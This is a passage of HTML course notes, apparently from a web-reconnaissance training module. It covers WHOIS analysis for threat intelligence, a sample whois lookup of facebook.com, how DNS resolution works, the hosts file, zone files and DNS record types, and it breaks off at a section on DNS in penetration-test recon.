&lt;h2 id=&quot;scenario-3-threat-intelligence-report&quot;&gt;Scenario 3: Threat Intelligence Report&lt;/h2&gt;

&lt;p&gt;A cybersecurity firm tracks the activities of a sophisticated threat actor group known for targeting financial institutions. Analysts gather WHOIS data on multiple domains associated with the group’s past campaigns to compile a comprehensive threat intelligence report.&lt;/p&gt;

&lt;p&gt;By analysing the WHOIS records, analysts uncover the following patterns:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registration Dates&lt;/code&gt;: The domains were registered in clusters, often shortly before major attacks.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrants&lt;/code&gt;: The registrants use various aliases and fake identities.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name Servers&lt;/code&gt;: The domains often share the same name servers, suggesting a common infrastructure.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Takedown History&lt;/code&gt;: Many domains have been taken down after attacks, indicating previous law enforcement or security interventions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These insights allow analysts to create a detailed profile of the threat actor’s tactics, techniques, and procedures (TTPs). The report includes indicators of compromise (IOCs) based on the WHOIS data, which other organisations can use to detect and block future attacks.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whois facebook.com

   Domain Name: FACEBOOK.COM
   Registry Domain ID: 2320948_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.registrarsafe.com
   Registrar URL: http://www.registrarsafe.com
   Updated Date: 2024-04-24T19:06:12Z
   Creation Date: 1997-03-29T05:00:00Z
   Registry Expiry Date: 2033-03-30T04:00:00Z
   Registrar: RegistrarSafe, LLC
   Registrar IANA ID: 3237
   Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com
   Registrar Abuse Contact Phone: +1-650-308-7004
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
   Name Server: A.NS.FACEBOOK.COM
   Name Server: B.NS.FACEBOOK.COM
   Name Server: C.NS.FACEBOOK.COM
   Name Server: D.NS.FACEBOOK.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; Last update of whois database: 2024-06-01T11:24:10Z &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
Registry Registrant ID:
Registrant Name: Domain Admin
Registrant Organization: Meta Platforms, Inc.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The WHOIS output for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt; reveals several key details:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Registration&lt;/code&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrar&lt;/code&gt;: RegistrarSafe, LLC&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Creation Date&lt;/code&gt;: 1997-03-29&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Expiry Date&lt;/code&gt;: 2033-03-30&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Owner&lt;/code&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrant/Admin/Tech Organization&lt;/code&gt;: Meta Platforms, Inc.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrant/Admin/Tech Contact&lt;/code&gt;: Domain Admin&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;This information identifies Meta Platforms, Inc. as the organization behind &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt;, and “Domain Admin” as the point of contact for domain-related matters. This is consistent with the expectation that Facebook, a prominent social media platform, is owned by Meta Platforms, Inc.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Status&lt;/code&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clientDeleteProhibited&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clientTransferProhibited&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clientUpdateProhibited&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverDeleteProhibited&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverTransferProhibited&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverUpdateProhibited&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;These statuses indicate that the domain is protected against unauthorized changes, transfers, or deletions on both the client and server sides. This highlights a strong emphasis on security and control over the domain.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name Servers&lt;/code&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A.NS.FACEBOOK.COM&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B.NS.FACEBOOK.COM&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C.NS.FACEBOOK.COM&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;D.NS.FACEBOOK.COM&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;These name servers are all within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt; domain, suggesting that Meta Platforms, Inc. manages its DNS infrastructure. It is common practice for large organizations to maintain control and reliability over their DNS resolution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Overall, the WHOIS output for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt; aligns with expectations for a well-established and secure domain owned by a large organization like Meta Platforms, Inc.&lt;/p&gt;

&lt;p&gt;While the WHOIS record provides contact information for domain-related issues, it might not be directly helpful in identifying individual employees or specific vulnerabilities. This highlights the need to combine WHOIS data with other reconnaissance techniques to understand the target’s digital footprint comprehensively.&lt;/p&gt;

&lt;h1 id=&quot;dns-1&quot;&gt;DNS&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name System&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) acts as the internet’s GPS, guiding your online journey from memorable landmarks (domain names) to precise numerical coordinates (IP addresses).&lt;/p&gt;

&lt;h2 id=&quot;how-dns-works&quot;&gt;How DNS Works&lt;/h2&gt;

&lt;p&gt;Imagine you want to visit a website like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt;. You type this friendly domain name into your browser, but your computer doesn’t understand words – it speaks the language of numbers, specifically IP addresses. So, how does your computer find the website’s IP address? Enter DNS, the internet’s trusty translator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://mermaid.ink/svg/pako:eNptkk1uwjAQha8y8rpcIItWkAAtUNQmlSrksDDxlEQQT-QfJIS4ex2nNG1arzx-n5-ex3NhBUlkEdtr0ZSwSnMFfhm36w425DTEVDfOou60do15XGJxMBCLosQtjEb3MLk8vcCMnJIP156ceA3WFIiYZ6ikgWSdwatDfQZLkKKh4wn1dnBngyZceuQxKYWFNS39jjtTWfyCvdsgb2t9c-wN4-CU_A7dy8mPjFOeYuG0qU4IK6KDa4bgLdjck9ZpZcC_20e7dWmYbRroGU-JLKxFjZCh7h88C_KCv62Sf9RFUJd87GxJurLCtsH-cssuUlfMu8blit2xGnUtKul_-NKKObMl1pizyG-l0Iec5erqOeEsZWdVsMhqh3dMk9uXLPoQR-Mr10hhMamE73L9fYqysqSfuwEKc3T9BOe0sj4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Your Computer Asks for Directions (DNS Query)&lt;/code&gt;: When you enter the domain name, your computer first checks its memory (cache) to see if it remembers the IP address from a previous visit. If not, it reaches out to a DNS resolver, usually provided by your internet service provider (ISP).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The DNS Resolver Checks its Map (Recursive Lookup)&lt;/code&gt;: The resolver also has a cache, and if it doesn’t find the IP address there, it starts a journey through the DNS hierarchy. It begins by asking a root name server, which is like the librarian of the internet.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Root Name Server Points the Way&lt;/code&gt;: The root server doesn’t know the exact address but knows who does – the Top-Level Domain (TLD) name server responsible for the domain’s ending (e.g., .com, .org). It points the resolver in the right direction.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLD Name Server Narrows It Down&lt;/code&gt;: The TLD name server is like a regional map. It knows which authoritative name server is responsible for the specific domain you’re looking for (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt;) and sends the resolver there.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authoritative Name Server Delivers the Address&lt;/code&gt;: The authoritative name server is the final stop. It’s like the street address of the website you want. It holds the correct IP address and sends it back to the resolver.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The DNS Resolver Returns the Information&lt;/code&gt;: The resolver receives the IP address and gives it to your computer. It also remembers it for a while (caches it), in case you want to revisit the website soon.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Your Computer Connects&lt;/code&gt;: Now that your computer knows the IP address, it can connect directly to the web server hosting the website, and you can start browsing.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;the-hosts-file&quot;&gt;The Hosts File&lt;/h3&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file is a simple text file used to map hostnames to IP addresses, providing a manual method of domain name resolution that bypasses the DNS process. While DNS automates the translation of domain names to IP addresses, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file allows for direct, local overrides. This can be particularly useful for development, troubleshooting, or blocking websites.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file is located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; on Windows and in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; on Linux and MacOS. Each line in the file follows the format:&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1       localhost
192.168.1.10    devserver.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file, open it with a text editor using administrative/root privileges. Add new entries as needed, and then save the file. The changes take effect immediately without requiring a system restart.&lt;/p&gt;

&lt;p&gt;Common uses include redirecting a domain to a local server for development:&lt;/p&gt;

&lt;p&gt;Code: txt&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1       myapp.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;testing connectivity by specifying an IP address:&lt;/p&gt;

&lt;p&gt;Code: txt&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;192.168.1.20    testserver.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or blocking unwanted websites by redirecting their domains to a non-existent IP address:&lt;/p&gt;

&lt;p&gt;Code: txt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;0.0.0.0       unwanted-site.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;its-like-a-relay-race&quot;&gt;It’s Like a Relay Race&lt;/h3&gt;

&lt;p&gt;Think of the DNS process as a relay race. Your computer starts with the domain name and passes it along to the resolver. The resolver then passes the request to the root server, the TLD server, and finally, the authoritative server, each one getting closer to the destination. Once the IP address is found, it’s relayed back down the chain to your computer, allowing you to access the website.&lt;/p&gt;

&lt;h3 id=&quot;key-dns-concepts&quot;&gt;Key DNS Concepts&lt;/h3&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name System&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt;), a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zone&lt;/code&gt; is a distinct part of the domain namespace that a specific entity or administrator manages. Think of it as a virtual container for a set of domain names. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt; and all its subdomains (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail.example.com&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog.example.com&lt;/code&gt;) would typically belong to the same DNS zone.&lt;/p&gt;

&lt;p&gt;The zone file, a text file residing on a DNS server, defines the resource records (discussed below) within this zone, providing crucial information for translating domain names into IP addresses.&lt;/p&gt;

&lt;p&gt;To illustrate, here’s a simplified example of what a zone file, for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt; might look like:&lt;/p&gt;

&lt;p&gt;Code: zone&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$TTL&lt;/span&gt; 3600 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Default Time-To-Live &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 hour&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@       IN SOA   ns1.example.com. admin.example.com. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                2024060401 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Serial number &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;YYYYMMDDNN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                3600       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Refresh interval
                900        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Retry interval
                604800     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Expire &lt;span class=&quot;nb&quot;&gt;time
                &lt;/span&gt;86400 &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Minimum TTL

@       IN NS    ns1.example.com.
@       IN NS    ns2.example.com.
@       IN MX 10 mail.example.com.
www     IN A     192.0.2.1
mail    IN A     198.51.100.1
ftp     IN CNAME www.example.com.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This file defines the authoritative name servers (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NS&lt;/code&gt; records), mail server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MX&lt;/code&gt; record), and IP addresses (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; records) for various hosts within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt; domain.&lt;/p&gt;

&lt;p&gt;DNS servers store various resource records, each serving a specific purpose in the domain name resolution process. Let’s explore some of the most common DNS concepts:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;DNS Concept&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
      &lt;th&gt;Example&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;A human-readable label for a website or other internet resource.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP Address&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;A unique numerical identifier assigned to each device connected to the internet.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.0.2.1&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS Resolver&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;A server that translates domain names into IP addresses.&lt;/td&gt;
      &lt;td&gt;Your ISP’s DNS server or public resolvers like Google DNS (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt;)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Root Name Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The top-level servers in the DNS hierarchy.&lt;/td&gt;
      &lt;td&gt;There are 13 root servers worldwide, named A-M: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.root-servers.net&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLD Name Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Servers responsible for specific top-level domains (e.g., .com, .org).&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Verisign&quot;&gt;Verisign&lt;/a&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.com&lt;/code&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/Public_Interest_Registry&quot;&gt;PIR&lt;/a&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.org&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authoritative Name Server&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The server that holds the actual IP address for a domain.&lt;/td&gt;
      &lt;td&gt;Often managed by hosting providers or domain registrars.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS Record Types&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Different types of information stored in DNS.&lt;/td&gt;
      &lt;td&gt;A, AAAA, CNAME, MX, NS, TXT, etc.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Now that we’ve explored the fundamental concepts of DNS, let’s dive deeper into the building blocks of DNS information – the various record types. These records store different types of data associated with domain names, each serving a specific purpose:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Record Type&lt;/th&gt;
      &lt;th&gt;Full Name&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
      &lt;th&gt;Zone File Example&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Address Record&lt;/td&gt;
      &lt;td&gt;Maps a hostname to its IPv4 address.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com.&lt;/code&gt; IN A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.0.2.1&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;IPv6 Address Record&lt;/td&gt;
      &lt;td&gt;Maps a hostname to its IPv6 address.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com.&lt;/code&gt; IN AAAA &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8:85a3::8a2e:370:7334&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CNAME&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Canonical Name Record&lt;/td&gt;
      &lt;td&gt;Creates an alias for a hostname, pointing it to another hostname.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog.example.com.&lt;/code&gt; IN CNAME &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webserver.example.net.&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MX&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Mail Exchange Record&lt;/td&gt;
      &lt;td&gt;Specifies the mail server(s) responsible for handling email for the domain.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com.&lt;/code&gt; IN MX 10 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail.example.com.&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NS&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Name Server Record&lt;/td&gt;
      &lt;td&gt;Delegates a DNS zone to a specific authoritative name server.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com.&lt;/code&gt; IN NS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ns1.example.com.&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TXT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Text Record&lt;/td&gt;
      &lt;td&gt;Stores arbitrary text information, often used for domain verification or security policies.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com.&lt;/code&gt; IN TXT &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;v=spf1 mx -all&quot;&lt;/code&gt; (SPF record)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Start of Authority Record&lt;/td&gt;
      &lt;td&gt;Specifies administrative information about a DNS zone, including the primary name server, responsible person’s email, and other parameters.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com.&lt;/code&gt; IN SOA &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRV&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Service Record&lt;/td&gt;
      &lt;td&gt;Defines the hostname and port number for specific services.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_sip._udp.example.com.&lt;/code&gt; IN SRV 10 5 5060 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sipserver.example.com.&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PTR&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Pointer Record&lt;/td&gt;
      &lt;td&gt;Used for reverse DNS lookups, mapping an IP address to a hostname.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.2.0.192.in-addr.arpa.&lt;/code&gt; IN PTR &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com.&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IN&lt;/code&gt;” in the examples stands for “Internet.” It’s a class field in DNS records that specifies the protocol family. In most cases, you’ll see “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IN&lt;/code&gt;” used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CH&lt;/code&gt; for Chaosnet, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HS&lt;/code&gt; for Hesiod) but are rarely used in modern DNS configurations.&lt;/p&gt;

&lt;p&gt;In essence, “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IN&lt;/code&gt;” is simply a convention that indicates that the record applies to the standard internet protocols we use today. While it might seem like an extra detail, understanding its meaning provides a deeper understanding of DNS record structure.&lt;/p&gt;

&lt;h2 id=&quot;why-dns-matters-for-web-recon&quot;&gt;Why DNS Matters for Web Recon&lt;/h2&gt;

&lt;p&gt;DNS is not merely a technical protocol for translating domain names; it’s a critical component of a target’s infrastructure that can be leveraged to uncover vulnerabilities and gain access during a penetration test:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Uncovering Assets&lt;/code&gt;: DNS records can reveal a wealth of information, including subdomains, mail servers, and name server records. For instance, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CNAME&lt;/code&gt; record pointing to an outdated server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev.example.com&lt;/code&gt; CNAME &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oldserver.example.net&lt;/code&gt;) could lead to a vulnerable system.&lt;/li&gt;
